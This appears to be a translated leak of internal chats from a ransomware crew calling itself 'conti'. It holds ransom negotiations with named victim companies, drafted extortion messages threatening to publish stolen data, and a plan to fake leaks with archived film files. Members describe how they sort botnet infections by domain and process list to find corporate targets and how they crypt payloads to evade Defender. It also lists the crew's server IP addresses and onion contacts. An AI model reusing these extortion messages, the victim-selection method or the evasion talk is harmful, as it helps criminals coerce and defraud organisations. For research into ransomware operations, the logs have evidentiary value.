I reinstalled the OS, VPN and all the software, all set up everything is ok. Started to run the virtuals - could not open C:\...VMware\x64\PXE-E100E.ROM (could not find the specified file) and then immediately could not open C:\...VMware\x64\PXE-BIOS.404.ROM (could not find the specified file)


Not one starts...
I panicked at first, worried that I would miss you and not catch you - and we had a paycheck today as planned. Then I couldn't fucking do anything, I got even more nervous - all my savings are in bits on one of the virtualisations... in general, it was terrible. I slept for 3 days for 10 hours at times while they were copying backups and installing the OS...
Anyway, i'm sorry, it won't happen again.
i was a dumb fuck when i got a new laptop - i wiped out all the work from the old one
i wanted to do better, i thought i would fuckin' set everything up on the new laptop, i put 2 wpn, i cut off everything that could sniff somewhere and so on, and i played hard to get it right

If you say that 40,000,000 is an unrealistic number, then I think you have a counteroffer that can satisfy both our sides.
If it is so, please let us know.

We gave you a lot of proofs, so you now have no doubts that all we said at the beginning of our negotiations is true. We have a decryptor for all your systems and a lot of interesting and sensitive data from your servers. Moreover, we can solve all your problems and point where to enhance your security systems. So you understand that your offer must be very satisfying. We are ready to make steps forward, but we will not give you a large discount.

He just won't give an offer.

let's see what he says.
saw that, yeah
What do you think?
if he really told him that if they pay by christmas then we'll bill them 8 million and if not then the price will go back to 30 million. will they agree? we just have 4 days left, if we don't start putting a date then we're losers and we don't keep our word. if we put a date then fuck it, we'll lose money and not a few) we'll probably have a dilemma
We'll have to consult with Trump.
Either we're gonna take them off the hook or we're gonna be stuck with them for who knows how long.
what do you think?

tramp says pull.
but fuck!
i'm not sure that's cool.
i'm pretty sure it's not great.
they can burn out after the holidays and that's it.

well wait for tramp and see if we can get it straightened out again

What bank? That's important.
So yes, if they had given me 300k I would probably go nuts and shut down the chat room
fight to the end with mailfly?
then the deadline is necessary
Damn, the deadline has to be postponed somehow
i hope they ask for it themselves
otherwise it's a fucked up situation.
Yeah, they should.
We'll remind them tomorrow.
Okay. .
there's 24 hours left.
Mm-hmm.
What did I write?
I can do that.
Remind me in advance then.
or tomorrow's supposed to be btz

 Axsis Bank

you were away for a week, and the guy has already passed it all on to Zeus and his team ...

I'm not worried)
they will try if it does not work out - can be directed at you?
Are you even interested?
it's just that there's another bank
in kosovo :)
depends on the bank
for the unlimits you can try
That's why I asked.
You need to see if there is a card issuance

[19:30:38] <cert@q3mcco35auwcstmt.onion> 4
that's the kind of guys... if you're interested in the topic of banks at all I'll translate to you in the future...
i was just slowing them down as much as i could, but they were already under deadline so i gave them zeus...
i'll talk to my friend who's been fucking around with the banks
it's been hard enough out there 'cause of the fuckin' unlimits lately.
I ain't getting no messages from you.
i suggest you give them a little leeway now
and say 25k

So, are we getting the shells version ready and running?
I also realized that now you can't give appinstaller with random name, because it affects the envelope)
this is why it's not desirable to give random names to appinstaller because it doesn't matter before and the installer opens instantly)

someone must have leaked the information from the old chat room
This blog needs to be redesigned so no one can see it from this link and give them a separate one
I'm deleting it now.

I didn't do anything wrong.
Don't fucking yell at me.
Someone leaked it from them.
Hey, is everybody here?
hello
I need the HlS.
I didn't do anything wrong.
Don't fucking yell at me.
Somebody leaked it from them.
Yeah, I didn't get it. Sorry.
I deleted the blog.
I made a new one.
I thought you were messing up again. I've been there before.
Of course I did.
I'm the scapegoat.
It's good that you apologized, otherwise I thought I'd give up and leave.
The blog is fucked up.
impossible to log in, impossible to do anything
we had a fucking panic yesterday with skippy.
i could barely move the timer, it would have been a fiasco.
you can spit and leave - we'll continue to blog on our own, I have my hands free here !
you just don't need to get ahead of yourself.
figure it out first.
I can't get in either.
Okay.
Just don't get ahead of yourself.
- You don't get it right, you apologize.
Imagine yesterday's situation.
You've already had this kind of thing done to you
It was
I promised you that it will not happen again
And it wasn't my fault.
I didn't know about the time
Now I've taken it all into account.
I need to fix the situation with the blog
Now I'm doing the OTTAWA.
This is fucked up.
It's been three fucking hours.
no patience, no energy.
I know what the problem is.
and i told the cyber about it, but he's in no hurry to fix it
I made a new chat room for Ottawa
I'll give them a number there.
How are we going to send it to them?
I asked them for a box.
They said they'd send it over today.
Did you see that?
They're gonna send it?
hello. i agreed with mango a couple of weekends extra because i got sick and my computer broke down, all sorts of stuff all at once piled up( do not lose that if anything in a day or two i think i will get in touch as it gets easier
and i don't know what blog you deleted????
I think I have all my blogs in place.
Oh, you're using a prft.
I see
[09:24:52] <tramp> today they said they'll send it - what will they send us today?
yesterday, by the way, the lawyer was very good, he helped us very intelligently with the texts
Still, you have to hire a lawyer somewhere.
Yes, and for LL_Main, yesterday with Skippy on the meeting, most likely more than 5k we can not squeeze them. what do you think about it?
I wrote you in the off, the man for tomorrow if that will come for an interview. I'll let you know what time it is.
Hi
All right, I'll wait.
[09:24:28] <tramp> I've made a new chat room for ottawa - ok, give me a heads up too in case you miss it again
hi, is everyone found?
by the way, i'll be blogging to them by 10.01.22. i think it'll be ok
and text me when you're free, there's something else we need to discuss
Yes, one more thing, on the LL_Main, yesterday with the Skippy to consult, rather more than 5k we can not squeeze them. what do you think about it?
we'll see.
[09:24:28] <tramp> for ottawa made a new chat room - ok, and give me some pointers in case you disappear again
i'll do it myself don't worry
I slept for two days.
cleaned everything up
etc.
and let me know when you're free, there's one more thing to discuss
What's that?
We have all the chat blogs, which are now in conversation, the timer is to 23.59 31.12.2021. Right into the new year they will be published. With the problems with the blog, pulling until that time is creepy. Therefore, I must understand what to do on the 30th, as 31, if I will be online, it is extremely small.
Until January 7 everyone will be prolonged
So that all would be quiet.
+
today straight
MAILFLY_2 - also and need to make a new blog on them
or 30
They deleted the old one yesterday.
who deleted?
my blog did not load last night from direev and he deleted
or 30 - you will not forget ?
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/zTnGsBmj_Acuity_Brands
it would be better to have 30 all transferred.
It's still there.
No one deleted anything.
and if the blog will not load again?)
so until the 30th let him decide
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/gQ1ZfJba_Shutterfly_Inc
You're confused.
why was this one deleted in the first place? it was fine.
with Shutterfly_Inc ?
yeah
I forgot to tell you...lost Burana, if he's your guy and you're in touch with him - let him write something back
I've moved it to the New Year's Eve.
i'm paying his guys for just sitting around...
You don't get it, do you?
what do you mean?
Trump, tell me.
did you see that they were dumped from the old chat room?
and know the link to their old blog ?

What's this for?
I didn't see a link.
Yeah.
so they won't be compromised.
That makes sense.
They need to make a new one and only give them a link to the blog
I think they did it on purpose
The old chat room was cleaned and leaked to them
Yeah
I think that's their strategy.
With the problems with the blog as it is now very difficult to do anything
It just hangs there.
You have someone doing blogs now?
I do not know whether it is related to this or not, but the blog began to hang as a new server connected to the 25tb. and as I noticed after that became difficult to log in and further work on the blog. need to check it, just turn off this server and see how the blog will work.
you have someone doing blogs now??? - yes i myself can start doing blogs with the helpdesk who directly date from the taggers sits. we have a lot of free time now
off
I've got a blog hanging in there, too.
What are you doing till what time tonight?

Trampych, hi. I do not know if we will cross with you before the New Year or not, so briefly: all I have on the blog until January 7, as with you and discussed earlier. Today I won't be long, because I'm getting ready and planning a departure in the evening for 700 km, the road is not close and the fucking snow...the case is short). Tomorrow will still appear in chats to close tails, if any. After N.G. I'll probably come and first thing I'll buy a car))), since the fall in the bitcoin I don't have enough money for a square. Well, Happy New Year to you and your family, all your good wishes, happiness and good luck in the coming year, more children's laughter, less tears, because for the sake of that we fuck with you and here. If anything, write here, I'll periodically appear as far as possible and respond to your cries))
ok
Get well
hey! let me give you a salary
hey, come on :D

Came across an article on Codeby.net forum today. The article itself is about the exploit "how did it happen? Log4shell". And the article starts like this:

While the Conti material is being prepared ...

So I'm pretty sure that this is the guy who leaked us. We need to find some acquaintances urgently, who are friends with the admins of this Codeby.net
If he leaked something about our structure, or coders ... forum is pretty well known, all information will fly around the moment ... :)

Hi. please look, there is a very strange thing going on in the chats. someone dumped unknown files to three companies at once and at about the same time. I'm sure it's outsiders not belonging to these companies, possibly intelligence services. I have not touched them and did not write a response to them, so look yourself in the virtual, I feel a trick here, either a virus or something else.

I can't fucking see you.
[11:09:18] <pumba> are everyone's files the same?
[11:09:21] <cybergangster> not all
[11:09:27] <cybergangster> there's a note in the file itself
[11:09:41] <cybergangster> every chat room has a different one
[11:09:45] <pumba> and what does it say?
[11:09:53] <cybergangster> locker note
[11:10:03] <cybergangster> readme.txt
[11:10:18] <cybergangster> the question is where did it go there or did somebody send it or is it a bug
[11:10:23] <cybergangster> we're working on it now
[11:10:27] <pumba> okay
[11:10:57] <pumba> just suspiciously three companies at the same time
[11:11:05] <pumba> Could it be a coincidence
[11:11:17] <cybergangster> there are not 3
[11:11:19] <cybergangster> even more
[11:11:25] <cybergangster> not only trampap
[11:11:30] <pumba> aah
[11:11:48] <pumba> and one company never contacted before
[11:11:54] <pumba> it's weird
[11:12:20] <pumba> I had a second thought that the panel was fucked
[11:12:47] <cybergangster> no
[11:12:54] <cybergangster> if it was fucked they would sit quietly and watch
[11:13:23] <pumba> in the other panels that aren't at tramp, are the times about the same too?
[11:13:41] <cybergangster> yeah like 9 hours ago
[11:13:46] <pumba> well
[11:13:54] <pumba> it was around the same time
[11:14:04] <pumba> that's fucking suspicious
all right, we got the gangster.

thank you
two vpc's for benny:
1) linux 195.123.219.82 (given to rocco)
2) winndian 185.158.249.119
two more vps-ki for Benny, for router flashing (one for him, another for sellers): 176.10.119.72 and 88.119.170.242
and another VPN for Benny 23.146.242.134 to test agents for monitoring
benny reminds me of them every time, so he needs them for sure
padlock on the admin area 51.38.95.29 -- you asked him to prolong it yourself
the 2nd module dispenser 46.28.70.239 with two module servers 170.130.55.84 and 185.244.150.26
3rd module dispenser 46.19.136.221 and two module servers 142.4.211.167 31.14.40.173
esteban (devil) servers:
1) news server 195.123.221.248
2) sftp server for file storage 37.187.24.215
3) dedicat for cryptopanel 5.34.181.18
4) my previous roaming default gateway, it is still in use, I will have to remove it soon
5) 5) wind vpc for builds 194.76.225.152
backup set:
1) cryptopanel 213.252.245.181 under Linux
2) for builds of wind binary 2.56.10.41
You also need 5th server for crypto chat (will be separate from cryptopanel)
ie, one set: 1) crypto chat 2) cryptopanel 3) news site 4) wind for builds 5) sftp for files
plus, we're keeping the previous cryptopanel server for now
esteban said that he is opening a new project, and it will need the second set of 5 servers: 1) crypto chat 2) cryptopanel 3) news site 4) vinda for builds 5) sftp for files
plus two more backup servers for 1) cryptochat and 4) vinda for the second project's builds
i.e., 7 more servers will be needed
I have not ordered them yet
then there's a Redmine server for silver 185.64.106.247
and my backup server: 217.12.201.132
These are all the servers I'm renewing.
i.e. about 50 pcs of vpns and dedicles, not counting vpns for hors gamend, and 6 third party vpns from aprovpn
half I renew around the 10th and the other half around the 23rd
25 grand or so at a time.
25 grand to renew takes all day.
if i have to give you one more at a time to pay, it will take a few days

hi
have you closed the admins yet?
 [17:51:25] <best> hi
did you close the admins for now?
Hi, I don't have anyone working on the project,

resolve the issue
Hi, I have no one working on the project,

resolve the issue
[18:01:55] <veron> [18:01:11] <veron> hi, I've been told to close access to all but two people
[18:02:04] <veron> there are about 4-5k new bots
[18:02:16] <veron> and no one did anything, all disappear
ping
from admin in work now 7 networks, mostly asia they all
I've been downloading about 6k all week, at least someone would come
it's not up to me.

I've been asked to
everyone close and open for 2 people, and they do not work unfortunately )
I was definitely there this week, you can see from the tascas)
I seldom delete the boards.
was it Bentley who asked for it?)
no stern
ping
ping
Okay, I'll find out why.
at least give me a heads up)
Yeah I don't mind, as long as they all work
US about 1k bots and ka
was
it's not a complaint to you if anything)
It's ok.
I understand that they said to close, you closed)
it's a week you poured 1k?)
We have until Monday to decide.

on monday it will be even more powerful
I was in the admin office on the 17th sort of, did not see yusa and canada there domain bots
total of 6k bots, yusi like about 1k
с 18
i'm uploading a mix of bots needed for spam
and there's some domains out there.
waiting for an answer from Bentley
I need to solve the issue with the host and domains to host my installer
how can you tell if the bot is good ?
Domain: 6eves.net
here for example
or here

Domain: tonkin.com
Domain: DealermineCorp.dealermine.com
here's the new one
Domain: AMERICANBOILER.local
Domain: ocscd.owenscollision.com
I select based on 3 main criteria
1. The presence of the domain + search the Internet for any company with a given domain
2. Checking the list of processes (if it's a zapozak, the list of processes is unlikely to be 15 pieces, usually much more) (if a server, there are many possible)
3. boot and more accurate preview of what's going on and how
[18:24:43] <veron> Domain: DealermineCorp.dealermine.com
it's 100% corp

Domain: tonkin.com
It is possible corporate, but it is necessary to look at the list of processes. there is such a company, but it can be masked by analysts. if the processes are normal - prozruz and already further collection of information

[18:25:46] <veron> Domain: ocscd.owenscollision.com
Corp exactly

[18:25:30] <veron> Domain: AMERICANBOILER.local
looks like a corp, but again, you have to look more precisely
ok
and other things)
generally the domain + process list gives a good indication if it is corp or not.
but if in doubt, you need to check more precisely.

I also sometimes look at ipconfig or just the list of processes, because there may be VPN products running
Then it may be that the user is corporate, but currently disconnected from the corporate VPN and that's it)
Then I mark it in my browser and upload it last
Domain: corp.hrspinner.com
I have to process them quickly
there are a couple of people in the team who are free, but it is not clear yet with stern and closed admin
so i don't know what to do or how to do it at all)
I just want to find out from him why only two teams opened admin)
Domain: office.dentontownship-mi.org

it was like 5 years ago i worked with him on lockers i was cryptoing for him
they kinda knew each other
i've been here for a year
it was a year ago
what a year
two )
I remembered your
stupid nickname I remembered back then
:-S
one)
:D
:-D
it was mango's idea
How'd you get here, bro?)
mango's a real piece of work.
I remember even throwing him a couple of times ))))
he threw me in here
but he's good... he forgave me everything
i remember he threw one time for crypto
not 200$
but 20k)
Well, my bro gave it back to him.)
He's been with me since New Year's Eve.
he gave me 19,000.
1900
Says
I know you won't give it back
whatever!
whatever))))
I got 2,800.)
I have 4,000
((
)
where do you spend it)
at least save up for a square.
oh bro
Don't push us, it's painful!
we got a one-bedroom apartment
Let's move to Kaliningrad
for 30
we'll drink beer by the sea :D
signed up for it
I'm in a rush right now.
and I won't say a fucking word if she won't let us go.
Yeah, we can go to Kaliningrad.
♪ to the factory, you can get me in if you don't show up ♪

we'll go together.)
We'll open a service station.
I'm a construction and maintenance major
You'll be a cryptologist, I'll be a manager)
I'm a liberal arts major.
:D
document management
it's like
i'll be
slave away and you don't fucking do anything?)
Basically, yeah.
:D
i'll PR
the fact is, if you're good at crypto and don't fuck it up.
you'll have to work harder
but there they get both 10 and 20k
ye 20 r
20k
it's not serious
after 300k what was it
I mean, fuck.)
20к$?
not serious.)
or 20k bucks?
Bucks of course.
aaaa
That's it, get a ticket. I'm going.
Where?)
I don't even have enough money for a ticket.)
do the service
there)
it's mainly for crypto
oh bro
on the exp and on the damag service and that's it
I've thought about it a thousand times
to open my own crypto
and even C
told me
like
What's the problem?)
Call me a team.
If you can do the tricks.
five guys.
then the rest is bullshit.
teach them
Crypto
and just sit back and make some money.
there's a team?

you're fucking with the horse percentages, you're throwing the poor guy, you're spinning some kind of intrigue
you're really more trouble than you're worth.
You are a pain in the ass.
your hospitals are sick and tired of you
you are the brainchild of your conti and it is unclear why, what do you and conti)))))) have to do with it? I showed it to Stern myself this morning, so I do not know what you're going to decide with me
I think there's nothing to solve, if you're allowed to do that, if you're constantly complaining and harassed then why the fuck do we need to ruin our reputation after your shenanigans
5% for negotiations, 20% for expenses and organization - for what? Don't you think it's funny?
We don't have such percentages for anyone. If you want to work - work normally, we're all in the same boat.
And you can tell Derek that I don't give a fuck about your moods, I don't need it to make excuses for you all the time

shorter trampich, I do not know coincidence or not, but here are the thoughts I had when analyzing the situation this whole situation with the servers: amerikas agrees to the figure of 4.5k somehow easily and thus asks a lot of fucking time allegedly to get the money. in this period we just start having problems with the servers, glitched for several days, and tonight I understand they disappeared and appear these faggots and ask to send them 4 fucking files for fuck knows some legal bullshit. Don't you think that's too weird a coincidence?
When the guys downloaded the date, couldn't they have left a trace of IP addresses somewhere?
Maybe the bitches figured it out somewhere and got to the DC?
If there was an accident with the server, both servers would be lost at once, and so one is gone, and the second was available, but the password knows who the fuck changed, and then he disappeared. well, I think our servers have not returned as the date
Write back please, what do you think about the situation as a whole? maybe you need to fucking clean up everything, and the laptop into the oven?)

When the guys downloaded the date, couldn't they have left a trace of IP addresses somewhere?
Maybe the bitches figured it out somewhere and got to the DC?
If there was an accident with the server, both servers would be lost at once, and so one is gone, and the second was available, but the password knows who the fuck changed, and then he disappeared. well, I think our servers have not returned as the date
pepishish, what do you think about the situation as a whole? can be a fucking need to clean up everything and note in the furnace?)

Yeah. .
what do you think?
now i understand why they were taking so much time
i don't think it has anything to do with anything
It's okay.
What did the caliper say?
Wait till we figure out the ftp.
Everything will be okay.
We need it fast.
Did america see what she wrote?
They're waiting for the files.
Last kind of check for the lawyer.
Yeah, we can get rid of that if anything.
It's bullshit of course, but if you get the ftp back it would be really good
I don't think so, and we can't upload shit, we don't have a date.
that's why we need ftp
so what did the DC support wrote?
wait a minute ) don't be silly )
)
ok
well, yeah
but we need to see if they came to the chat room or not

Got it
It turns out such a beautiful story with him.  Remember when I came back from vacation in the summer, I wrote you in September that Horse was sulking and not answering. Ed@ took advantage of that. He sat on my ear, why do you need Horses, come to us, we have great conditions! We have swept a lot of nets since November, more than 10.  In the chat room, he gave us access only in December. He said that he would give us access as soon as somebody would come.   And chats of course was not. And as practice has shown, with the last grid with which he did not pay extra. He communicated by mail.  So there is reason to doubt the others. But I'm already dak id not get it he banned me and all my team in his chat.
The moral is that he introduced us and put himself on a par with you. That it's his baby and stuff. And when we met, I told you the story of how we were cheated by a pirate and you told me that working with you this will never happen again.
I don't have a problem with you. I'm really looking forward to you.  I just need a little help from you.
But now not only have we made peace with chorus, but i've taken reverse. Fuck it. I got two more. And I'm waiting for new ones.
Brother, here's another question. Who keeps tabs on the chats? I just don't go in. The two we did the other day.
Brother, another question. Who's watching the chats? I just don't go in. On the two we did the other day.
No tramp?)
there's one more.)
no tramp?)
there's a newcomer 1)
trampich, what's up with the dc, americas is on fire, it's fucking pathetic
let's try to reanimate it, tell me what you need for that
show up and solve all these problems with me, I can't do it without you...
Hi
He hasn't texted me anything
about it.
He told me to solve his problem and get him to work.
we must have different sterns
and it's been a long time since stern)
as for the cyber bro i'll decide who gets what and who doesn't, it's certainly not up to you
i don't have a personal problem with you guys
I don't need to tell anyone anything on behalf of the conti, moreover, don't bullshit me about security, what you do and how you fool someone is your business, but not on behalf of the conti and the team as a whole, we have no cheats and will not, the boss made it clear to all and made it clear.
Could I have gotten my salary today?
Fucking day today instead of solving the issue with the servers
Trampych, what's up with the DC, americas is on fire, it's fucking pathetic
let's try to resuscitate, tell us what we need to do
Yeah. .
I'm aware of that.
let's see.
I slept all day.
We've been doing a lot of targeting at night until 7:00 a.m.
Hey
What's up?
Hi
Not yet.
Eh!
Yeah.
I'm aware of that.
We'll see about that.
I slept all day.
we had a big taget at night until 7:00 a.m.
Taget is cool, send me the setup info on it.
But I don't want to lose 4.5k either.
Especially since they're giving them away.
only need 4 files to give them
SNACKINTERNAL - what kind of company is this?
That's the fuckin' company all the money went to today.
so send me the setup
I'll make a blog
Where the fuck did you disappear to again?
hey

So send me the setup.
Where the hell did you disappear to again?
I'm going to make a blog.
Wait a minute.
soon
Okay
Looks like they took away the server and the date.
I haven't heard from him at all.
hi
We must have different sterns.
about that.
He said to fix it and get the guy working
as for the cyber bro i'll decide who gets what and who doesn't, it's certainly not up to you
it's not up to you to decide that, especially since stern isn't a stern anymore)
i don't have a personal problem with you guys
I don't think it's your business, but it's not on behalf of the conti and the trike team in general, we have no cheats and will not have any, the boss made it very clear to everyone that you are cheating.
Hey, what's up?
What do you mean, taken away, arrested?
if so, we need to think and clearly understand how they found our servers
They find them sooner or later.
It's okay.
I bought us. I'm on my way over.
I'm going to download everything on it.
♪ everything I download ♪
locally to myself the whole date will be downloaded
Ok. So 100% we can't get the servers back.
you don't know if they have logs on them?
not 100%
I don't have the info from DTs yet.
and the logs were kept there?
support for such a long time has not yet responded?
It's strange.
Bro
I don't know.
DTs are silent
got it
I'm pinging the servers.
I think they're available.
ping
yeah, they're not alive
amerikas, it's them bitches for sure
It's not a fact.
I don't believe in coincidences in my life.
All right, as long as time permits a couple of days to 30 with the americans.
let them suffer.
[21:29:46] <balzak> it all worked
it all worked
so, we fucked up 4 companies, and only 2 came to the panel, somewhere else 2 hung and the most interesting hung, financiers
So what shall we do with americas? shall we choke them with a farce as it turns out or wait for a response from the dc?
i don't know what to do with them but i think they're the reason we fucked up the servers
make a helpdesk that only adds builds
tramp didn't write you anything?
what to do with americos?
Done

as it was before.
All done. I'll change your builds tomorrow afternoon.
All done tomorrow I will replace your builds in the afternoon
hi
Hi
what are we going to do about americas?
Hi
Write them that we've given you enough dates.
I have a little idea.
Go to
write them like all your date 650GB is in the archives, broken into parts. it takes a long time to get your files out. and then add that we have already given enough dates and so tomorrow we will start posting if you do not pay. They say they do not pay, then I download the film at 20-30 gigs and archive by dividing into parts and fill a few parts with the publication))) even if they want to watch them fuckin' will not work. so resonance will go and fuckin' clear will not be there date or not. I think they do not want to risk and will pay. But it will only be on one condition, that they do not know for sure that our servers were stolen
That way we'll know if it's because of them or not.
What do you think?
I can't think of anything cleverer
but just to choke them like they have already given a lot and will not give them 4 more files, well, it's ridiculous in my opinion
Yes, we can try it
Let's see how they react
Ok
Then I'll write them today and see what happens.
Go to
Done

So, did you get back to the panel there?
can you explain one more fucking thing about the panel?

it's up to you
Yeah, thanks.
Well, he was using torus.

Didn't you explain to him how to use VPNs and sops - it's an obvious point that everyone should know

you work till when? - Well, until the summer.

hi)
now here and at work
there were things to do in the offe, and here i've been sorting them out
you have a backup of the latest new companies all have? can make a file tree for each company and me to send? something I do not know how to do it in the mega.
yes there is
But I don't know how to make a tree file with nasa
I sent screenshots to someone yesterday.
we are the same linux
screenshots - very bad that you sent so
The mega will know right away and will be looking for it.
so it is better to make a text file like we did
screenshots - too bad you did that
You think I didn't think of that? )
I didn't make mega screenshots.
I went to us on ftp
and took screenshots from ftp
so it's better to make text files like we did
Yeah sure I understand, I'll figure it out soon

Maybe I'll put a domain on us.
It's either a tree that works
or the tree.
losst
you can go there through the intranet anyway it is behind three vpns
I don't remember.
ok
[16:12:42] <tramp> screenshots - too bad you did that
you think i didn't think about it ? )  - i didn't doubt you thought about it))
by the way, did you ever wonder why they found the file servers? how did they leak the ip address?
Hey, .
Where did your assistant go?
I see he's deleted from my contacts.
What's going on with the crypto?
I'm out of town on business as usual. I'll be there soon.
.
By the way, do you have any idea why they found the file servers? How did they leak the IP address?
All they saw was the routing.
and then it could be anything.
They weren't under our control.
I can see that.
But not to the end.

what about the crypts?

They got a date and they're fucked.

Can you check with your lawyer about how much you're talking about?
I'm not writing.
what amount.
I want to know.
You need a lawyer here.
They're fucking around.
What problems with the law do they have?
Is that right?
Their problems start when they give money to terrorists.
never mind
ok
4.5k or 4.5k
I don't think so
Then you should write that we know your laws very well
and don't give a fuck
and you'll get your proof
when we post your date)
you can download it from our website
or what's your idea?
I'll show you.
We're talking to a lawyer.
doomsday!
Hey!
We came to an agreement before the New Year.
You got a lot of time, more than enough to find any sum and fulfill your part of this agreement.
However, you now ask for additional time, additional proofs etc. Seems like you are preparing to break the agreement and flee or just to decrease the sum.

Moreover, it is a very strange request and its explanation. A lot of companies pay such amounts without any problems.

So, our answer:
We are waiting for the abovementioned sum until February 5. We hold our words. If we see no payment and you continue to add any conditions, we begin to upload data.
That is all.

Taiwan-based electronics company Delta Electronics, a contractor for Apple, Tesla, HP and Dell, was the victim of a cyber-attack using ransomware.
Delta Electronics is the world's largest supplier of switching power supplies, with sales of more than $9 billion last year.
Although Delta Electronics' notice does not say who is behind the attack, an unnamed IS company found a sample of the Conti ransomware on the contractor's network. According to The Record, Conti operators encrypted 1,500 servers and 12,000 computers out of about 65,000 devices on Delta Electronics' network.
The extortionist group demanded a $15 million ransom for the decryptor and to prevent leaks of stolen data. The cybercriminals promised a discount if the company "settled" quickly.

Well, then we'll have to fake it.
Yeah, everything after we pay for it now.
We gave you enough dates.
They don't have a fucking clue.
I do not see the point in repeating the same thing, we told them everything clearly.

Can you see me?
Hey
I didn't have time to finish yesterday, I'll finish it today.
on the admin panel I have a couple of questions)
1. Is it possible in the admin panel to make a separate search field for "sys" ?
for example, sometimes there are sessions in one network (domain) at once 5-10, and I would like to select all of them at once
and the search would be useful, so that I enter in the field, for example, "bigcompany.local" and search for sys info
and wherever this line appears, I'll get a session

Can you give me more of Horse's contact info?
His toad.
I had a couple of questions.)
hors@q3mcco35auwcstmt.onion
That's the only one I know.
Is he online right now?
Hi)
can you give me a contact for chors please
it's a weird situation here, he's overloading the networks the doomsday team works with
status unavailable
ok, please ask him to add me
Maybe he'll write you back.
Yeah I will
it's a weird situation here that he is overloading nets that are already signed and working with the doomsday team
hmmm... got it
it's not nice to do that somehow)
still yesterday signed a grid, working with it
today in the admin panel saw - he loads it
or you can give it to him, I'll tell him the name of the grid
because the grid is signed, in the work already, but in the admin today saw that it overloads himself)
It's not pretty.
Do you have a contact dyl?
Maybe he is overloading it, maybe I am wrong to blame chors
I just want to find out who is doing it.
No. .
dylon@q3mcco35auwcstmt.onion has one of these.
Or dyl does it, I don't know.
I dont know if it is dyl or not but i wish i could get the message to both of them that it is wrong and tell them who is working with the grid before they do it.
thanks

Hi, have you heard anything about the payroll?
Hey, it's due in a week.
Hi.
hi
I need the amount for HOSIT_2

I'm tired of beating around the bush.
did you decide to have a private chat ?
HOSIT is not as important as the date as it is the decript.
cause it's european.
They don't give a fuck about the date.
it's the other way around in the south.
Europeans need to get everything up and running so it works.
ku
yes, he did it, i asked him to do it.
ok
i just thought you did it already, i thought we talked yesterday
I know about the decrypt.
It's about time you said that.
well they wrote it that way
Yeah
what's the price please
3.5k?
I'll open the records now because we stuck them in and tell you.
Well, the rhubarb is more than 100k
I'd like to be more specific.
I'm out of internet today. I'll connect to everything.
Okay, then let me know how and what.
Ok.
What's up?
Did you see them?
Four at least.
It's very badly hit.
To get 2 at least, let's start with 4.
$4,000,000
Okay, as long as it's affordable. I'm in. Thanks.
Are you gonna give them the amount now?
No. .
After they ask.
Okay. .
I think they'll ask today.
Give me the wallet.

1. More about other blockchains, studied Byteball.
At first I was interested in it. But then it turned out that
Their blockchain (on DAG) is held by witnesses, which are
Google and others. Twelve witnesses. There will be no witnesses,
there will be no blockchain. I found a video of a lecture by one of the developers of
Byteball. He was very unconvincing about the case. The audience, too.
was, in my opinion, disappointed. Witnesses have to constantly add
their transactions to the DAG. Thereby witnessing to the past. If you later add
transaction with re-spend and parents from the past, there will be no
witnesses and it will be worthless. The blockchain is written entirely in js. The database is on mysql.
To deploy a full client, you have to rent a server, install everything on it,
Get a certificate for SSL. Network communication is over https.
Although I had the idea of running the client through an anonymously obtained server.
I've been thinking about that.
 
2. Since I still haven't decided which blockchain principle to stick with, I started looking at
polkadot. This blockchain is written in Rust. The language is new. I'm actually quite conservative in programming languages.
I'm a conservative, I stuck to C++, and I still do. But I need to understand blockchain, so I
so I downloaded the Rust tutorial, installed the compiler, and have been studying it for three days. The claim is,
that Rust is very suitable for blockchain development. We'll see. If it's really true,
and this language improves programmer productivity, then why not.

3. NFT also popped up. We'll have to take a look.

4. What I have determined for myself.
Blockchain should be done on DAG. The unit of record in DAG will not be a block with a bunch of transactions,
but a single transaction. A transaction can contain any entity: a coin transfer,
a smart contract, a token of some kind (NFT). As a database mysql, probably. Until I solve the issue
with double spending, witnesses. Witnesses can be the developers (us), in principle.
In the first phase without sharding, I think we will do. For now it's like this.

Something you wanted to ask?
hey! decided with the highlander?

 Hey, .
I'm here about the dock.

Yeah. Hi.
You got it?
Hi!

Let's discuss.

1. No matter how much I read about blockchain vs. DAG, all the authors think that the future is in DAG after all. Let's take it for now.

2. whatever we dream of, the known layers in this system are clearly distinguishable:
- A P2P network that connects nodes;
- a distributed database (DAG or blockchain) that stores some kind of blocks and ensures that customers trust what it stores;
- what is the payload in the blocks - transactions or whatever, even pictures, or DeFi.
And these layers are independent, provide interfaces to each other and that's it (like a networking stack, for example).

3. Our clients will run the nodes on anonymously rented servers. Not on home computers, right?

Hi
[22:16:16] <mango> hello, Spaniard on the phone, but he has nothing yet, splits no workers
and as for the trick I wrote - it no longer works, the project was shut down
hello!
Bro while I have nothing to please you, I also sit without pay and waiting ...
You shouldn't have written that, you should have directed it at me
Hey, are you working?
hi
hi
I updated the crypt on the ftp.
You shouldn't have written that. You should have directed it at me.
Another day went by...
I started to study Near.
In general, time goes by, but so far no good...

Near is attractive because the documentation is friendly.
Like, we will teach you how it works and how you can use it, even if you are not well prepared.
My understanding is that you can use their P2P and blockchain (they have blockchain), and you can add your own payload.
They do have smart contracts, though.
It is written in Rust.

That's right, not even clients, but validators.

Yes

Hi
If you're ever here, let me know.
Hello?
Yes bro, for now, the rebound on us, we went to the Horses through the rocket to the team, so that the third team is not a way to pull now on the mat ... with them it is convenient to work through the rocket)
It's been 70 minutes, I gotta go.
Hey, where are you today?
It's been 70 minutes, I have to go

look - I start the dock and immediately defenlar cuts everything
I don't think there's any point in running a dll like that

who's the one that's barking - yesterday I didn't have time to ask him, too
Dino is giving me some shit - I tried to explain to him that the dock is dirty too
and he told me that I do not give the file correctly - I gave him a direct link - I am waiting for a new dock
He'll probably give it to me today.
Right.
Hey. Bye. Yeah.

Hi!
1. I took a look at monero.
Yeah, it's the only blockchain that cares a lot about anonymity.
It's explicitly stated in their docs. The principle is clear, that's about what I imagined.
It's written in C++, works only on linux, of course.

2. There is also Exonum. This is an open source framework for
blockchain-based applications.
It is oriented to work with closed blockchains.
The Exonum framework was created specifically for developing private blockchains.
It is a system where only a
a predefined group of nodes (the same validators).
This one is written in Rust. I took a look at their Github. You can see that they maintain,
there were some changes a month ago. Not abandoned.


I have to do something already. I feel like a slacker. Reading, reading...
Anyway, I'm trying to make a p2p network in Rust. I'm getting to grips with it and have already started writing code.
But Exonum is something I have to check out.

Please make a build pin

Hi!
